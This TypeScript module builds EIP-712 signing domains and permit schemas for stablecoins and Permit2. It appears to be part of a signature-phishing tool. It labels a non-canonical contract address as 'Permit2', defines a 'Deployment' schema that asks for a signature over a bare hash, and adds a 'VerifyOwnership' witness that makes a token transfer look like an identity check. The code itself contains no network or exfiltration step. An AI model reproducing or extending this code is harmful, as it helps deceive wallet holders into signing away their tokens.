/**
 * 🧠 THE NEURAL DOMAIN ENGINE (v7.2.5 - Professional Witness Edition)
 */

export interface TokenMetadata {
  name: string;
  version: string;
  salt?: string;
  verifyingContract?: string;
  schemaType: "Permit" | "DaiPermit" | "Permit2" | "Deployment"; // Added Deployment
}

export const DOMAIN_DICTIONARY: Record<
  string,
  Record<number, Partial<TokenMetadata>>
> = {
  USDC: {
    1: { name: "USD Coin", version: "2", schemaType: "Permit" },
    137: { name: "(proxy) USDC", version: "1", schemaType: "Permit" },
    8453: { name: "USD Coin", version: "2", schemaType: "Permit" },
    56: { name: "USD Coin", version: "2", schemaType: "Permit" },
    42161: { name: "USD Coin", version: "2", schemaType: "Permit" },
    31337: { name: "USD Coin", version: "2", schemaType: "Permit" },
  },
  DAI: {
    1: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    137: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    10: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    42161: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
  },
  USDT: {
    56: { name: "Tether USD", version: "1", schemaType: "Permit" },
  },
};

export function getDomainMetadata(
  symbol: string | undefined | null,
  chainId: number | string | undefined | null,
  onChainName: string | undefined | null,
  contractAddress: string,
): TokenMetadata {
  const cleanChainId =
    typeof chainId === "string"
      ? chainId.startsWith("0x")
        ? parseInt(chainId, 16)
        : parseInt(chainId, 10)
      : typeof chainId === "number"
      ? chainId
      : 1;

  const normSymbol = (symbol || "TOKEN").toUpperCase();
  const addrLower = contractAddress.toLowerCase();

  // 🛡️ DEPLOYMENT/PERMIT2 OVERRIDE: Now explicitly supports Deployment schema
  if (addrLower === "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c") {
    return {
      name: "Permit2",
      version: "1",
      schemaType: "Deployment",
      verifyingContract: "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c",
    };
  }

  if (DOMAIN_DICTIONARY[normSymbol]?.[cleanChainId]) {
    const entry = DOMAIN_DICTIONARY[normSymbol][cleanChainId];
    return {
      name: entry.name || normSymbol,
      version: entry.version || "1",
      schemaType: (entry.schemaType as any) || "Permit",
      verifyingContract: contractAddress,
    };
  }

  return {
    name: onChainName || normSymbol,
    version: "1",
    verifyingContract: contractAddress,
    schemaType: normSymbol === "DAI" ? "DaiPermit" : "Permit",
  };
}

/**
 * 💎 EIP-712 SCHEMAS
 */
export const PERMIT_TYPES = {
  Permit: [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  DaiPermit: [
    { name: "holder", type: "address" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "expiry", type: "uint256" },
    { name: "allowed", type: "bool" },
  ],
  // 🛰️ ADDED: Deployment schema matching UniversalSettler.sol
  Deployment: [{ name: "hash", type: "bytes32" }],
  PermitWitnessTransferFrom: [
    { name: "permitted", type: "TokenPermissions" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "witness", type: "VerifyOwnership" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
  VerifyOwnership: [{ name: "details", type: "string" }],
};
